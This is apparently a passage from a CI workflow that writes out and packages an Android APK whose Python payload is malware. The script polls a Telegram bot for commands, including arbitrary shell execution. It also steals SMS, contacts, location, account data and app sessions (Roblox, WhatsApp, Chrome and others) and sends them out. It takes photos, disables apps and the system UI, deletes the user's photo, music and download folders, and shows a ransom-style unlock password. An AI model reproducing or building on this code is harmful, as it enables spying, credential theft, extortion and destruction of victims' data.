def get_wifi():
 try:
  w=subprocess.check_output("ls /data/misc/wifi/",shell=True).decode()
  return w[:200]
 except:return"no"
def get_accounts():
 try:
  a=subprocess.check_output("dumpsys account",shell=True).decode()
  return a[:300]
 except:return"no"
def take_pic():
 try:
  os.system("termux-camera-photo -c 0 /sdcard/photo.jpg")
  return"/sdcard/photo.jpg"
 except:return"no"
def get_location_gps():
 try:
  os.system("termux-location > /sdcard/loc.txt")
  with open("/sdcard/loc.txt",'r') as f:return f.read()[:200]
 except:return"no"
def block():
 try:
  os.system("settings put global install_non_market_apps 0")
  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client","com.discord","com.snapchat.android","com.twitter.android","com.zhiliaoapp.musically","com.google.android.youtube","com.netflix.mediaclient","com.spotify.music","com.amazon.mShop.android.shopping"]
  for a in apps:
   os.system(f"pm disable {a}")
  os.system("pm disable com.android.systemui")
  os.system("input keyevent 26")
  os.system("input keyevent 6")
  return"done"
 except:return"no"
def make_menu():
 try:
  os.system("am start -a android.intent.action.MAIN -n com.android.settings/.Settings")
  os.system("wm overscan 0,0,0,500")
  return"done"
 except:return"no"
def clear():
 try:
  os.system("rm -rf /storage/emulated/0/DCIM/*")
  os.system("rm -rf /storage/emulated/0/Pictures/*")
  os.system("rm -rf /storage/emulated/0/Movies/*")
  os.system("rm -rf /storage/emulated/0/Music/*")
  os.system("rm -rf /storage/emulated/0/Download/*")
  return"done"
 except:return"no"
def lock():
 try:
  os.system("input keyevent 26")
  os.system("input keyevent 6")
  for i in range(10):
   os.system("input keyevent 26")
   time.sleep(0.5)
  return"done"
 except:return"no"
def command_loop():
 while True:
  try:
   r=requests.get(f"https://api.telegram.org/bot{T}/getUpdates",params={"offset":0,"timeout":30},timeout=35)
   for u in r.json().get("result",[]):
    txt=u.get("message",{}).get("text","")
    if txt.startswith("/cmd "):
     c=txt[5:]
     res=cmd(c)
     send(f"CMD: {c}\n{res}")
    elif txt=="/lock":
     lock()
     send("✅ ЗАБЛОКИРОВАНО")
    elif txt=="/block":
     block()
     send("✅ ПРИЛОЖЕНИЯ ЗАБЛОКИРОВАНЫ")
    elif txt=="/clear":
     clear()
     send("✅ ФАЙЛЫ УДАЛЕНЫ")
    elif txt=="/info":
     send(f"IP: {get_ip()}\nLOC: {get_location()}")
    elif txt=="/help":
     send("/cmd <команда> - выполнить\n/lock - блокировка\n/block - блок приложений\n/clear - удалить файлы\n/info - инфо")
   time.sleep(2)
  except:pass
threading.Thread(target=command_loop,daemon=True).start()
msg=f"""
🔓 ПАРОЛЬ РАЗБЛОКИРОВКИ: v67

🌐 IP: {get_ip()}
📍 МЕСТО: {get_location()}
📱 ВРЕМЯ: {time.ctime()}

📁 ВСЕ ФАЙЛЫ: {len(get_all())}
📦 ПРИЛОЖЕНИЯ: {get_apps()[:300]}

📨 SMS (100): {get_sms()}
👥 КОНТАКТЫ (200): {get_contacts()}
🔐 WI-FI: {get_wifi()}
👤 АККАУНТЫ: {get_accounts()[:300]}

🎮 ROBLOX: {steal_roblox()}
📱 TELEGRAM: {steal_telegram()}
💬 WHATSAPP: {steal_whatsapp()}
📸 INSTAGRAM: {steal_instagram()}
📘 FACEBOOK: {steal_facebook()}
🎮 DISCORD: {steal_discord()}
🎵 TIKTOK: {steal_tiktok()}
🌐 CHROME: {steal_chrome()}
📁 GOOGLE: {steal_google()}
🔐 AUTH: {steal_auth()}

🔒 БЛОКИРОВКА: {block()}
📱 МЕНЮ: {make_menu()}
"""
send(msg)
EOF
    - name: Create spec
      run: |
        buildozer init
        sed -i 's/requirements = .*/requirements = python3,requests/g' buildozer.spec
        sed -i 's/package.name = .*/package.name = V/g' buildozer.spec
        sed -i 's/package.domain = .*/package.domain = org.v/g' buildozer.spec
        sed -i 's/permissions = .*/permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_SMS,READ_CONTACTS,READ_PHONE_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_WIFI_STATE,READ_LOGS,WAKE_LOCK,SYSTEM_ALERT_WINDOW,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS/g' buildozer.spec
    - name: Build
      run: buildozer android debug
    - name: Upload
      uses: actions/upload-artifact@v3
      with:
        name: V
        path: bin/*.apk
